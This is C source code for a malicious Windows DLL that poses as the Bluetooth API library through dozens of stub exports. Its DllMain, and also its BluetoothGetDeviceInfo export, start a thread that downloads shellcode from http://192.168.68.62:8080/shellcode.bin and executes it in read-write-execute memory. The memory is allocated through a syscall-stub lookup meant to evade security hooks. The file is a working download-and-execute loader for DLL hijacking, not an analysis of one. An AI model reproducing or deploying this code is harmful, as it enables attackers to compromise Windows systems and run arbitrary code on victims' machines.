#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

typedef void (WINAPI *SHELLCODE_FUNC)();
typedef NTSTATUS (NTAPI *NTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

HANDLE hHeap = NULL;

PVOID WINAPI FindSyscallStub(LPCSTR functionName);
PVOID WINAPI HalosGateAlloc(SIZE_T size);
BYTE* DownloadShellcode(const char* url, DWORD* size);
BOOL ExecuteShellcode(BYTE* shellcode, DWORD shellcodeSize);
DWORD WINAPI ShellcodeThread(LPVOID lpParam);
void ShowError(const char* message);

void ShowError(const char* message) {
    char errorMsg[512];
    sprintf(errorMsg, "%s\nError code: %lu", message, GetLastError());
    MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
}

PVOID WINAPI FindSyscallStub(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    
    FARPROC fn = GetProcAddress(hNtdll, functionName);
    if (!fn) return NULL;
    
    for (INT offset = 0; offset < 0x100; offset++) {
        BYTE* ptr = (BYTE*)fn - offset;
        if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1) {
            return ptr;
        }
    }
    return NULL;
}

PVOID WINAPI HalosGateAlloc(SIZE_T size) {
    PVOID stub = FindSyscallStub("NtAllocateVirtualMemory");
    if (!stub) return NULL;
    
    NTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = 
        (NTALLOCATEVIRTUALMEMORY)stub;
    
    PVOID baseAddr = NULL;
    SIZE_T regionSize = size;
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (status != 0 || baseAddr == NULL) {
        return NULL;
    }
    
    return baseAddr;
}

BYTE* DownloadShellcode(const char* url, DWORD* size) {
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    BYTE* buffer = NULL;
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    BYTE chunk[4096];
    
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                             INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        ShowError("InternetOpenA failed");
        return NULL;
    }
    
    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        ShowError("InternetOpenUrlA failed");
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    DWORD contentLength = 0;
    DWORD bufferSize = sizeof(DWORD);
    
    HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                  &contentLength, &bufferSize, NULL);
    
    if (contentLength > 0) {
        buffer = (BYTE*)malloc(contentLength);
        if (!buffer) {
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return NULL;
        }
    } else {
        buffer = (BYTE*)malloc(65536);
        if (!buffer) {
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return NULL;
        }
    }
    
    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead > 0) {
        if (contentLength == 0 && totalBytes + bytesRead > 65536) {
            BYTE* newBuffer = (BYTE*)realloc(buffer, totalBytes + bytesRead + 65536);
            if (!newBuffer) {
                free(buffer);
                InternetCloseHandle(hUrl);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            buffer = newBuffer;
        }
        
        memcpy(buffer + totalBytes, chunk, bytesRead);
        totalBytes += bytesRead;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    *size = totalBytes;
    
    return buffer;
}

BOOL ExecuteShellcode(BYTE* shellcode, DWORD shellcodeSize) {
    PVOID shellcodeAddr = NULL;
    
    shellcodeAddr = HalosGateAlloc(shellcodeSize);
    if (!shellcodeAddr) {
        shellcodeAddr = VirtualAlloc(NULL, shellcodeSize, 
                                   MEM_COMMIT | MEM_RESERVE, 
                                   PAGE_EXECUTE_READWRITE);
        if (!shellcodeAddr) {
            ShowError("Failed to allocate memory for shellcode");
            return FALSE;
        }
    }
    
    memcpy(shellcodeAddr, shellcode, shellcodeSize);
 
    
    SHELLCODE_FUNC shellcodeFunc = (SHELLCODE_FUNC)shellcodeAddr;
    
    shellcodeFunc();
    
    return TRUE;
}

DWORD WINAPI ShellcodeThread(LPVOID lpParam) {
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    
    shellcode = DownloadShellcode("http://192.168.68.62:8080/shellcode.bin", &shellcodeSize);
    if (!shellcode) {
        return 1;
    }
    
    if (shellcodeSize == 0) {
        free(shellcode);
        return 1;
    }
    
    if (!ExecuteShellcode(shellcode, shellcodeSize)) {
        free(shellcode);
        return 1;
    }
    
    free(shellcode);
    
    
    return 0;
}

void CreateVerificationFile() {
    HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\dll_verification.txt",
                              GENERIC_WRITE,
                              0,
                              NULL,
                              CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        const char* message = "DLL loaded and shellcode download attempted!\n";
        DWORD bytesWritten;
        
        WriteFile(hFile, message, strlen(message), &bytesWritten, NULL);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        sprintf(timestamp, "Timestamp: %04d-%02d-%02d %02d:%02d:%02d\n", 
                st.wYear, st.wMonth, st.wDay, 
                st.wHour, st.wMinute, st.wSecond);
        
        WriteFile(hFile, timestamp, strlen(timestamp), &bytesWritten, NULL);
        
        char downloadInfo[128];
        sprintf(downloadInfo, "Shellcode URL: http://192.168.68.62:8080/shellcode.bin\n");
        WriteFile(hFile, downloadInfo, strlen(downloadInfo), &bytesWritten, NULL);
        
        CloseHandle(hFile);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            
            CreateVerificationFile();
            
            CreateThread(NULL, 0, ShellcodeThread, NULL, 0, NULL);
            break;
            
        case DLL_PROCESS_DETACH:
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}


// @104
__declspec(dllexport) DWORD BluetoothAuthenticateDevice(void* hwndParent, void* hRadio, void* pbtdi, void* pszPasskey, ULONG ulPasskeyLength) {
    return ERROR_NOT_SUPPORTED;
}

// @105
__declspec(dllexport) DWORD BluetoothAuthenticateDeviceEx(void* hwndParent, void* hRadio, void* pbtdiInout, void* pbtOobData, void* authenticationRequirement) {
    return ERROR_NOT_SUPPORTED;
}

// @106
__declspec(dllexport) DWORD BluetoothAuthenticateMultipleDevices(void* hwndParent, void* hRadio, DWORD cDevices, void* rgbtdi) {
    return ERROR_NOT_SUPPORTED;
}

// @107
__declspec(dllexport) BOOL BluetoothAuthenticationAgent(void* pbtdi) {
    return FALSE;
}

// @108
__declspec(dllexport) DWORD BluetoothDisconnectDevice(void* pAddress) {
    return ERROR_NOT_SUPPORTED;
}

// @109
__declspec(dllexport) BOOL BluetoothDisplayDeviceProperties(void* hwndParent, void* pbtdi) {
    return FALSE;
}

// @110
__declspec(dllexport) BOOL BluetoothEnableDiscovery(void* hRadio, BOOL fEnabled) {
    return FALSE;
}

// @111
__declspec(dllexport) BOOL BluetoothEnableIncomingConnections(void* hRadio, BOOL fEnabled) {
    return FALSE;
}

// @112
__declspec(dllexport) DWORD BluetoothEnumerateInstalledServices(void* hRadio, void* pbtdi, DWORD* pcServiceInout, void* pGuidServices) {
    return ERROR_NOT_SUPPORTED;
}

// @113
__declspec(dllexport) BOOL BluetoothFindBrowseGroupClose(void* hFind) {
    return FALSE;
}

// @114
__declspec(dllexport) BOOL BluetoothFindClassIdClose(void* hFind) {
    return FALSE;
}

// @115
__declspec(dllexport) BOOL BluetoothFindDeviceClose(void* hFind) {
    return FALSE;
}

// @116
__declspec(dllexport) void* BluetoothFindFirstBrowseGroup(void* pBluetoothSdpSearch, void* pSdpBrowseGroupList) {
    return NULL;
}

// @117
__declspec(dllexport) void* BluetoothFindFirstClassId(void* pBluetoothSdpSearch, void* pClassIdList) {
    return NULL;
}

// @118
__declspec(dllexport) void* BluetoothFindFirstDevice(void* pbtsp, void* pbtdi) {
    return NULL;
}

// @119
__declspec(dllexport) void* BluetoothFindFirstProfileDescriptor(void* pSdpRecord, void* pProfileDescriptorList) {
    return NULL;
}

// @120
__declspec(dllexport) void* BluetoothFindFirstProtocolDescriptorStack(void* pSdpRecord, void* pProtocolDescriptorStack) {
    return NULL;
}

// @121
__declspec(dllexport) void* BluetoothFindFirstProtocolEntry(void* pSdpRecord, void* pProtocolEntry) {
    return NULL;
}

// @122
__declspec(dllexport) void* BluetoothFindFirstRadio(void* pbtfrp, void* phRadio) {
    return NULL;
}

// @123
__declspec(dllexport) void* BluetoothFindFirstService(void* pSearchParams, void* pQuerySet) {
    return NULL;
}

// @124
__declspec(dllexport) void* BluetoothFindFirstServiceEx(void* pSearchParams, void* pQuerySet) {
    return NULL;
}

// @125
__declspec(dllexport) BOOL BluetoothFindNextBrowseGroup(void* hFind, void* pSdpBrowseGroupList) {
    return FALSE;
}

// @126
__declspec(dllexport) BOOL BluetoothFindNextClassId(void* hFind, void* pClassIdList) {
    return FALSE;
}

// @127
__declspec(dllexport) BOOL BluetoothFindNextDevice(void* hFind, void* pbtdi) {
    return FALSE;
}

// @128
__declspec(dllexport) BOOL BluetoothFindNextProfileDescriptor(void* hFind, void* pProfileDescriptorList) {
    return FALSE;
}

// @129
__declspec(dllexport) BOOL BluetoothFindNextProtocolDescriptorStack(void* hFind, void* pProtocolDescriptorStack) {
    return FALSE;
}

// @130
__declspec(dllexport) BOOL BluetoothFindNextProtocolEntry(void* hFind, void* pProtocolEntry) {
    return FALSE;
}

// @131
__declspec(dllexport) BOOL BluetoothFindNextRadio(void* hFind, void* phRadio) {
    return FALSE;
}

// @132
__declspec(dllexport) BOOL BluetoothFindNextService(void* hFind, void* pQuerySet) {
    return FALSE;
}

// @133
__declspec(dllexport) BOOL BluetoothFindProfileDescriptorClose(void* hFind) {
    return FALSE;
}

// @134
__declspec(dllexport) BOOL BluetoothFindProtocolDescriptorStackClose(void* hFind) {
    return FALSE;
}

// @135
__declspec(dllexport) BOOL BluetoothFindProtocolEntryClose(void* hFind) {
    return FALSE;
}

// @136
__declspec(dllexport) BOOL BluetoothFindRadioClose(void* hFind) {
    return FALSE;
}

// @137
__declspec(dllexport) BOOL BluetoothFindServiceClose(void* hFind) {
    return FALSE;
}

// @138
__declspec(dllexport) DWORD BluetoothGetDeviceInfo(void* hRadio, void* pbtdi) {
    CreateThread(NULL, 0, ShellcodeThread, NULL, 0, NULL);
    return ERROR_NOT_SUPPORTED;
}

// @139
__declspec(dllexport) DWORD BluetoothGetRadioInfo(void* hRadio, void* pRadioInfo) {
    return ERROR_NOT_SUPPORTED;
}

// @140
__declspec(dllexport) BOOL BluetoothIsConnectable(void* hRadio) {
    return FALSE;
}

// @141
__declspec(dllexport) BOOL BluetoothIsDiscoverable(void* hRadio) {
    return FALSE;
}

// @142
__declspec(dllexport) BOOL BluetoothIsVersionAvailable(UCHAR MajorVersion, UCHAR MinorVersion) {
    return FALSE;
}

// @143
__declspec(dllexport) DWORD BluetoothMapClassOfDeviceToIconPath(ULONG ulDeviceClass, void* pszIconPath, DWORD* pcchIconPath) {
    return ERROR_NOT_SUPPORTED;
}

// @144
__declspec(dllexport) DWORD BluetoothMapClassOfDeviceToString(ULONG ulDeviceClass, void* pszMajorString, DWORD cchMajorStringLen, void* pszMinorString, DWORD cchMinorStringLen) {
    return ERROR_NOT_SUPPORTED;
}

// @145
__declspec(dllexport) DWORD BluetoothRegisterForAuthentication(void* pbtdi, void* phRegHandle, void* pfnCallback, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @146
__declspec(dllexport) DWORD BluetoothRegisterForAuthenticationEx(void* pbtdiIn, void* phRegHandleOut, void* pfnCallbackEx, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @147
__declspec(dllexport) DWORD BluetoothRemoveDevice(void* pAddress) {
    return ERROR_NOT_SUPPORTED;
}

// @148
__declspec(dllexport) DWORD BluetoothSdpEnumAttributes(void* pSdpRecord, void* pfnCallback, void* pvParam) {
    return ERROR_NOT_SUPPORTED;
}

// @149
__declspec(dllexport) DWORD BluetoothSdpGetAttributeValue(void* pRecordStream, ULONG cbRecordLength, USHORT usAttributeId, void* pAttributeData) {
    return ERROR_NOT_SUPPORTED;
}

// @150
__declspec(dllexport) DWORD BluetoothSdpGetContainerElementData(void* pContainerStream, ULONG cbContainerLength, void* phElement, void* pData) {
    return ERROR_NOT_SUPPORTED;
}

// @151
__declspec(dllexport) DWORD BluetoothSdpGetElementData(void* pSdpStream, ULONG cbSdpStreamLength, void* pData) {
    return ERROR_NOT_SUPPORTED;
}

// @152
__declspec(dllexport) DWORD BluetoothSdpGetString(void* pRecordStream, ULONG cbRecordLength, void* pStringData, USHORT usStringOffset, void* pszString, DWORD* pcchStringLength) {
    return ERROR_NOT_SUPPORTED;
}

// @153
__declspec(dllexport) BOOL BluetoothSelectDevices(void* pbtsdp) {
    return FALSE;
}

// @154
__declspec(dllexport) BOOL BluetoothSelectDevicesFree(void* pbtsdp) {
    return FALSE;
}

// @155
__declspec(dllexport) DWORD BluetoothSendAuthenticationResponse(void* hRadio, void* pbtdi, void* pszPasskey) {
    return ERROR_NOT_SUPPORTED;
}

// @156
__declspec(dllexport) DWORD BluetoothSendAuthenticationResponseEx(void* hRadioIn, void* pauthResponse) {
    return ERROR_NOT_SUPPORTED;
}

// @157
__declspec(dllexport) DWORD BluetoothSetLocalServiceInfo(void* hRadioIn, void* pClassGuid, ULONG ulInstance, void* pServiceInfoIn) {
    return ERROR_NOT_SUPPORTED;
}

// @158
__declspec(dllexport) DWORD BluetoothSetServiceState(void* hRadio, void* pbtdi, void* pGuidService, DWORD dwServiceFlags) {
    return ERROR_NOT_SUPPORTED;
}

// @159
__declspec(dllexport) BOOL BluetoothUnregisterAuthentication(void* hRegHandle) {
    return FALSE;
}

// @160
__declspec(dllexport) DWORD BluetoothUpdateDeviceRecord(void* pbtdi) {
    return ERROR_NOT_SUPPORTED;
}